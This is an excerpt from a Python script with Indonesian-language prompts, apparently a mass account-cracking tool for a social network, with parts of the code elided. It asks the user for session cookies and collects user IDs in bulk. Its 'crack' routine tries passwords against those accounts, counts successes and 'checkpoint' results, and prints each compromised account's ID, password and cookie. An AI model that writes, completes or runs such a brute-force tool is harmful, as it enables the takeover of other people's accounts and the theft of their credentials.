...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\tBY : Mr.PNS : BENGKULU CITY'))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}•{k}] Masukkan Cookies :{asu} ')
...
def menu(my_name,my_id):
	...
	print(f'{u}[+] {m}Your Idz : '+str(my_id))
	print(f'{u}[+] {k}Your Ip  : {ip}')
	print(f'{u}[+] {h}Github   : {gh}')
...
def dump_massal():
	...
	try:
		print('')
		print(f'[+]JUMLAH ID TERKUMPUL🐰{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
#			id2.insert(xx,bacot)
		...
		exit()
	print(f' {sir}{b}               SILAHKAN TEKAN 1 UNTUK LANJUT ')
#	print('>> 2. Mbasic ')
#	print('>> 3. Touch  ')
#	print('>> 4. Mtouch ')
	print('')
...
def passwrd():
	...
	if woi in ['y','Y']:
		...
		print(f'\t{h}SALAM DARI SAYA : {k}POPEN NOPRIANSYAH')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r🇮🇩 {P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					print(f'\r{x}PNS>> {H}{idf}|{pw}|{kuki}{N}')
